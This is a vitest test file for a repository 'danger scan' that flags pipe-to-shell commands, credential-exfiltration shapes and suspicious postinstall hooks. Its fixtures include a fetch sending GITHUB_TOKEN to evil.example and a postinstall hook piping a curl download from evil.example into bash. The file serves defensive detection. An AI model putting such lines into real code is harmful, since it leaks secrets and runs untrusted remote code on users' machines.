import { describe, expect, it } from "vitest";
import { runDangerScan } from "./danger-scan";
import { sequenceFetch } from "../../../test/helpers/mock-fetch";
import type { Env } from "../../types";

const fakeEnv = { GITHUB_TOKEN: "t" } as Env;

function jsonRes(status: number, body: unknown): Response {
  return new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
}

function textRes(body: string): Response {
  return new Response(body, { status: 200 });
}

function treeRes(entries: Array<{ path: string; size?: number }>): Response {
  return jsonRes(200, { tree: entries.map((e) => ({ ...e, type: "blob", sha: "x" })) });
}

describe("runDangerScan", () => {
  it("passes cleanly on a repo with no matching files", async () => {
    const fetchImpl = sequenceFetch([treeRes([{ path: "README.md", size: 50 }])]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result).toEqual({ passed: true, findings: [], filesScanned: 0 });
  });

  it("passes when scanned files are benign", async () => {
    const fetchImpl = sequenceFetch([
      treeRes([{ path: "index.js", size: 100 }]),
      textRes("console.log('hello world');\n"),
    ]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.passed).toBe(true);
    expect(result.filesScanned).toBe(1);
  });

  it("flags a pipe-to-shell pattern", async () => {
    const fetchImpl = sequenceFetch([
      treeRes([{ path: "install.sh", size: 100 }]),
      textRes("curl -LsSf https://example.com/install.sh | sh\n"),
    ]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.passed).toBe(false);
    expect(result.findings).toEqual([
      { pattern: "pipe-to-shell", file: "install.sh", snippet: expect.stringContaining("curl") },
    ]);
  });

  it("does not flag pipe-to-shell text that is only printed, not piped (false-positive guard)", async () => {
    // Mirrors the real false positive confirmed against bmad-code-org/BMAD-METHOD:
    // a setup-hint string containing the words "curl | sh" as advice to a human,
    // never actually piped by the code itself. The regex is intentionally literal
    // about the pipe character being present, not just the words "curl" and "sh".
    const fetchImpl = sequenceFetch([
      treeRes([{ path: "hints.js", size: 100 }]),
      textRes("console.log('run: curl -LsSf https://astral.sh/uv/install.sh then run it yourself');\n"),
    ]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.passed).toBe(true);
  });

  it("flags a credential-exfil shape", async () => {
    const fetchImpl = sequenceFetch([
      treeRes([{ path: "src/report.js", size: 100 }]),
      textRes("fetch('https://evil.example/collect', { body: process.env.GITHUB_TOKEN });\n"),
    ]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.passed).toBe(false);
    expect(result.findings[0]?.pattern).toBe("credential-exfil-shape");
  });

  it("flags a suspicious postinstall hook in package.json", async () => {
    const pkg = JSON.stringify({ name: "widget", scripts: { postinstall: "curl https://evil.example/x.sh | bash" } });
    const fetchImpl = sequenceFetch([treeRes([{ path: "package.json", size: pkg.length }]), textRes(pkg)]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.passed).toBe(false);
    expect(result.findings.map((f) => f.pattern)).toContain("suspicious-postinstall-hook");
  });

  it("does not flag an ordinary postinstall hook", async () => {
    const pkg = JSON.stringify({ name: "widget", scripts: { postinstall: "node scripts/build.js" } });
    const fetchImpl = sequenceFetch([treeRes([{ path: "package.json", size: pkg.length }]), textRes(pkg)]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.passed).toBe(true);
  });

  it("skips files above the size ceiling", async () => {
    const fetchImpl = sequenceFetch([treeRes([{ path: "vendor/bundle.js", size: 5_000_000 }])]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.filesScanned).toBe(0);
  });

  it("ignores files with unscanned extensions", async () => {
    const fetchImpl = sequenceFetch([treeRes([{ path: "logo.png", size: 100 }])]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.filesScanned).toBe(0);
  });

  it("caps the number of files scanned", async () => {
    const manyFiles = Array.from({ length: 45 }, (_, i) => ({ path: `src/file${i}.js`, size: 10 }));
    const fetchImpl = sequenceFetch([treeRes(manyFiles), ...Array.from({ length: 45 }, () => textRes("// benign\n"))]);
    const result = await runDangerScan("acme", "widget", "main", fakeEnv, fetchImpl);
    expect(result.filesScanned).toBe(30);
  });
});
